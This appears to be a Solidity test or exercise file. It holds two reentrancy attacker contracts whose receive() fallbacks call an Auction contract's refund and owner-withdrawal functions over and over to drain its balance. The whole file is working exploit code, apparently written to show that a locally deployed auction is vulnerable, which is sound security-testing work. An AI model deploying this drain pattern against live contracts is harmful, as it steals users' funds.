// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "./Auction.sol";
import "./GLDToken.sol";

contract ReetrancyBetBack
{
    Auction private auction;
    uint myBet;

    constructor(Auction _auction)
    {
        auction = _auction;
    }

    function increaseBet() external payable
    {
        auction.increaseMyBet{value: msg.value}();
        myBet = auction.myBet();
    }

    function getBetBack() external
    {
        auction.getBetBack();
    }

    receive() external payable
    {   
        if (myBet <= address(auction).balance)
        {
            auction.getBetBack();
        }
    }
}

contract ReetrancyOwnersMoney
{
    Auction public auction;
    uint myMoney;
    uint64 public startTime;
    uint64 public endTime;
    uint16 constant ONE_HOUR_SECS = 60 * 60;

    function createAndInitialize() external
    {
        GLDToken token = new GLDToken(1000000);
        auction = new Auction(token, 1000);

        token.approve(address(auction), 1000);

        startTime = uint64(block.timestamp) + ONE_HOUR_SECS;
        endTime = startTime + ONE_HOUR_SECS;

        auction.Initialize(startTime, endTime);
    }

    function initializeWin() external
    {
        myMoney = auction.winnerBet();
    }

    function getOwnersMoney() external
    {
        auction.getOwnersMoney();
    }

    receive() external payable
    {   
        if (myMoney <= address(auction).balance)
        {
            auction.getOwnersMoney();
        }
    }
}